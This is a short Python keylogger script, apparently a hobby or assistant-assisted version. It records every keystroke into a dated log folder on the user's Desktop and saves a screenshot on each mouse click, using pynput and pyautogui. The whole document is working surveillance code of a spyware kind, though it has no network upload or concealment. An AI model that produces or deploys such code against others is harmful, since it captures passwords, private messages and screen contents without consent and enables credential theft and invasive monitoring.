from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as py
from pynput.keyboard import Key


dataAtual = datetime.now()
data = dataAtual.strftime("%d - %m")
diretorioRaiz = "/Users/Usuário/Desktop/keyloger" + data + "/"
arquiviosLog = diretorioRaiz + 'Keylogger.log'

try:
    os.mkdir(diretorioRaiz)
except:
    pass

def on_press(tecla):
    with open(arquiviosLog, 'a') as log:
        try:
            # Check if the pressed key is a special key
            if tecla == Key.enter:
                log.write('\n')  # Add a newline for the "enter" key
            else:
                # Check if the pressed key is a character
                if hasattr(tecla, 'char'):
                    log.write(tecla.char)
                else:
                    # Handle non-character keys (e.g., control, shift)
                    log.write(str(tecla).replace('Key.', ''))
        except AttributeError:
            # Handle non-character keys (e.g., control, shift)
            log.write(str(tecla).replace('Key.', ''))

# ... (rest of your code)


def on_click(x, y, button, pressed):
    if pressed:
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H-%M-%S")
        minhaPrint.save(os.path.join(diretorioRaiz, "printKeylogger_" + horarioPrint + ".jpg"))

KeyboardListener = KeyboardListener(on_press=on_press)
MouseListener = MouseListener(on_click=on_click)

KeyboardListener.start()
MouseListener.start()
KeyboardListener.join()
MouseListener.join()
